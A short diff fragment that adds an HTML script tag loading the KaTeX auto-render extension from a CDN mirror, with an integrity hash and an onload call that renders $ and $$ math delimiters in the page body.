+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
 
 
 
